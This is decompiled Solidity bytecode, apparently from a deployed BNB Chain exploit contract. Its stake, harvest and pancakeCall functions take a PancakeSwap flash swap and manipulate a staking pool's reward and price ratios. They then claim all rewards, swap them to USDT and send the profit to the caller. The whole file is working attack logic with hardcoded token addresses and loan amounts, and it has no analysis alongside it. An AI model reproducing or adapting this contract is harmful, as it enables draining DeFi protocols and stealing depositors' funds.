// Decompiled by library.dedaub.com
// 2024.01.07 19:54 UTC
// Compiled using the solidity compiler version 0.8.0


// Data structures and variables inferred from the use of storage instructions
uint256 _pancakeCall; // STORAGE[0x7]
uint256 stor_0_0_19; // STORAGE[0x0] bytes 0 to 19
uint256 stor_2_0_19; // STORAGE[0x2] bytes 0 to 19
uint256 stor_3_0_19; // STORAGE[0x3] bytes 0 to 19
uint256 stor_4_0_19; // STORAGE[0x4] bytes 0 to 19
uint256 _stake; // STORAGE[0x5] bytes 0 to 19
uint256 stor_6_0_19; // STORAGE[0x6] bytes 0 to 19



function receive() public payable { 
}

function stake() public payable { 
    require(tx.origin == msg.sender);
    require(bool(_stake.code.size));
    v0 = _stake.bond(stor_2_0_19).gas(msg.gas);
    require(bool(v0), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    if (2) {
        CALLDATACOPY(v1.data, msg.data.length, 64);
    }
    require(0 < v1.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
    require(1 < v1.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
    v2 = new address[](v1.length);
    v3 = v4 = 0;
    v5 = v6 = v2.data;
    v7 = v8 = v1.data;
    while (v3 < v1.length) {
        MEM[v5] = address(MEM[v7]);
        v5 += 32;
        v7 += 32;
        v3 += 1;
    }
    require(bool(stor_0_0_19.code.size));
    v9, /* uint256 */ v10 = stor_0_0_19.swapETHForExactTokens(10 ** 20, v2, address(this), block.timestamp, v11, address(0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c)).value(0x6f05b59d3b20000).gas(msg.gas);
    require(bool(v9), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    RETURNDATACOPY(v10, 0, RETURNDATASIZE());
    MEM[64] = v10 + (~0x1f & RETURNDATASIZE() + 31);
    v12 = v13 = 0;
    require(v10 + RETURNDATASIZE() - v10 >= 32, v13, v13);
    require(MEM[v10] <= uint64.max, v13, v13);
    require(v10 + MEM[v10] + 31 < v10 + RETURNDATASIZE(), v13, v13);
    require(MEM[v10 + MEM[v10]] <= uint64.max, Panic(65)); // failed memory allocation (too much memory)
    require(!((MEM[64] + (MEM[v10 + MEM[v10]] << 5) + 32 > uint64.max) | (MEM[64] + (MEM[v10 + MEM[v10]] << 5) + 32 < MEM[64])), Panic(65)); // failed memory allocation (too much memory)
    MEM[64] = MEM[64] + (MEM[v10 + MEM[v10]] << 5) + 32;
    MEM[MEM[64]] = MEM[v10 + MEM[v10]];
    v14 = v15 = MEM[64] + 32;
    v16 = v17 = 32 + (v10 + MEM[v10]);
    require(v10 + RETURNDATASIZE() >= 32 + (v10 + MEM[v10] + (MEM[v10 + MEM[v10]] << 5)), v13, v13);
    while (v12 < MEM[v10 + MEM[v10]]) {
        MEM[v14] = MEM[v16];
        v12 += 1;
        v14 += 32;
        v16 += 32;
    }
    require(bool((address(0x55d398326f99059ff775485246999027b3197955)).code.size));
    v18, /* bool */ v19 = address(0x55d398326f99059ff775485246999027b3197955).approve(_stake, 10 ** 20).gas(msg.gas);
    require(bool(v18), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(v19 == bool(v19));
    require(bool(_stake.code.size));
    v20 = _stake.stake(10 ** 20).gas(msg.gas);
    require(bool(v20), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
}

function harvest() public nonPayable { 
    require(tx.origin == msg.sender);
    require(bool(_stake.code.size));
    v0, /* uint256 */ v1 = _stake.call(0x3408d587, address(this)).gas(msg.gas);
    require(bool(v0), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(bool(stor_3_0_19.code.size));
    v2, /* uint256 */ v3 = stor_3_0_19.balanceOf(stor_4_0_19).gas(msg.gas);
    require(bool(v2), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(bool(stor_3_0_19.code.size));
    v4, /* uint256 */ v5 = stor_3_0_19.balanceOf(_stake).gas(msg.gas);
    require(bool(v4), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    v6 = _SafeMul(100, v5);
    v7 = _SafeMul(v1, v3);
    v8 = _SafeMul(101, v7);
    require(v6, Panic(18)); // division by zero
    require(bool((address(0x55d398326f99059ff775485246999027b3197955)).code.size));
    v9, /* uint256 */ v10 = address(0x55d398326f99059ff775485246999027b3197955).balanceOf(stor_4_0_19).gas(msg.gas);
    require(bool(v9), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(v10 >= v8 / v6, Panic(17)); // arithmetic overflow or underflow
    _pancakeCall = v10 - v8 / v6;
    v11 = new bytes[](2);
    CALLDATACOPY(v11.data, msg.data.length, 2);
    MEM[MEM[64]] = 0x22c0d9f00000000000000000000000000000000000000000000000000000000;
    v12 = new bytes[](v11.length);
    v13 = 0;
    while (v13 < v11.length) {
        v12[v13] = v11[v13];
        v13 += 32;
    }
    if (v13 > v11.length) {
        v12[v11.length] = v13;
    }
    require(bool(stor_6_0_19.code.size));
    v14 = stor_6_0_19.swap(0x6c6b935b8bbd400000, 0, address(this), v12).gas(msg.gas);
    require(bool(v14), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    MEM[MEM[64]] = 0x70a0823100000000000000000000000000000000000000000000000000000000;
    require(bool((address(0x55d398326f99059ff775485246999027b3197955)).code.size));
    v15, /* uint256 */ v16 = address(0x55d398326f99059ff775485246999027b3197955).balanceOf(address(this)).gas(msg.gas);
    require(bool(v15), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(bool((address(0x55d398326f99059ff775485246999027b3197955)).code.size));
    v17, /* bool */ v18 = address(0x55d398326f99059ff775485246999027b3197955).transfer(address(tx.origin), v16).gas(msg.gas);
    require(bool(v17), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(v18 == bool(v18));
    v19 = msg.sender.call().value(this.balance).gas(2300 * !this.balance);
    require(bool(v19), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
}

function pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes _data) public nonPayable { 
    require(msg.data.length - 4 >= 128);
    require(_data <= uint64.max);
    require(4 + _data + 31 < msg.data.length);
    require(_data.length <= uint64.max);
    require(4 + _data + _data.length + 32 <= msg.data.length);
    v0 = _data.data;
    if (0x6c6b935b8bbd400000 != _amount0) {
        require(bool(_stake.code.size));
        v1 = _stake.claimAllReward().gas(msg.gas);
        require(bool(v1), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
        v2 = _SafeMul(1003, _pancakeCall);
        require(1000, Panic(18)); // division by zero
        require(bool((address(0x55d398326f99059ff775485246999027b3197955)).code.size));
        v3, /* bool */ v4 = address(0x55d398326f99059ff775485246999027b3197955).transfer(stor_4_0_19, v2 / 1000).gas(msg.gas);
        require(bool(v3), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        require(v4 == bool(v4));
    } else {
        v5 = new uint256[](1);
        CALLDATACOPY(v5.data, msg.data.length, 1);
        v6 = new uint256[](v5.length);
        v7 = 0;
        while (v7 < v5.length) {
            MEM[32 + (v7 + v6)] = MEM[32 + (v5 + v7)];
            v7 += 32;
        }
        if (v7 > v5.length) {
            MEM[v6 + v5.length + 32] = v7;
        }
        require(bool(stor_4_0_19.code.size));
        v8 = stor_4_0_19.swap(0, _pancakeCall, address(this), v6).gas(msg.gas);
        require(bool(v8), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
        require(bool(stor_3_0_19.code.size));
        v9, /* bool */ v10 = stor_3_0_19.approve(stor_0_0_19, ~0).gas(msg.gas);
        require(bool(v9), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        require(v10 == bool(v10));
        v11 = new address[](2);
        CALLDATACOPY(v11.data, msg.data.length, 64);
        require(v11.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
        v12 = v11.data;
        v11[0] = stor_3_0_19;
        require(1 < v11.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
        v11[1] = address(0x55d398326f99059ff775485246999027b3197955);
        require(bool(stor_3_0_19.code.size));
        v13, /* uint256 */ v14 = stor_3_0_19.balanceOf(address(this)).gas(msg.gas);
        require(bool(v13), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        v15 = new address[](v11.length);
        v16 = v17 = 0;
        v18 = v19 = v15.data;
        v20 = v21 = v11.data;
        while (v16 < v11.length) {
            MEM[v18] = address(MEM[v20]);
            v18 += 32;
            v20 += 32;
            v16 += 1;
        }
        require(bool(stor_0_0_19.code.size));
        v22 = stor_0_0_19.swapExactTokensForTokensSupportingFeeOnTransferTokens(v14, 1, v15, address(this), block.timestamp, v23, stor_3_0_19).gas(msg.gas);
        require(bool(v22), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
        require(bool((address(0x55d398326f99059ff775485246999027b3197955)).code.size));
        v24, /* bool */ v25 = address(0x55d398326f99059ff775485246999027b3197955).transfer(stor_6_0_19, 0x6cf65a7e9047280000).gas(msg.gas);
        require(bool(v24), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        require(v25 == bool(v25));
    }
}

function _SafeMul(uint256 varg0, uint256 varg1) private { 
    require(!(bool(varg0) & (varg1 > ~0 / varg0)), Panic(17)); // arithmetic overflow or underflow
    return varg0 * varg1;
}

// Note: The function selector is not present in the original solidity code.
// However, we display it for the sake of completeness.

function function_selector( function_selector) public payable { 
    MEM[64] = 128;
    if (msg.data.length < 4) {
        require(!msg.data.length);
        receive();
    } else if (0x3a4b66f1 == function_selector >> 224) {
        stake();
    } else if (0x4641257d == function_selector >> 224) {
        harvest();
    } else {
        require(0x84800812 == function_selector >> 224);
        pancakeCall(address,uint256,uint256,bytes);
    }
}
